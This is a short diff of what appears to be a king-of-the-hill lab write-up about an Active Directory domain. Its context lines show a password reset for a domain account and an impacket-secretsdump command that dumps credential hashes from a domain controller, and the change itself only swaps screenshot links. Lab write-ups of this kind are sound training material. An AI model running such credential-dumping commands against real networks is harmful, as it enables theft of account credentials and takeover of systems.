@@ -154,8 +154,8 @@ After that, i changed the passwords of the domain admin accounts that i used to 
     net user peggy SUPER_L0NG_PASS123!
     ------------------------------------
     $impacket-secretsdump kingofthehill.local/peggy:password2@10.109.124.214
+<img width="714" height="302" alt="image" src="https://github.com/user-attachments/assets/87319f8f-d6a0-4a34-bead-28ed47a859c9" />
 
-<img width="836" height="308" alt="image" src="https://github.com/user-attachments/assets/c533843d-df9f-422a-aced-0b7027e7db0e" />
 
 <img width="714" height="236" alt="image" src="https://github.com/user-attachments/assets/3da1b254-e231-43f6-99c9-59c994d49f30" />
 
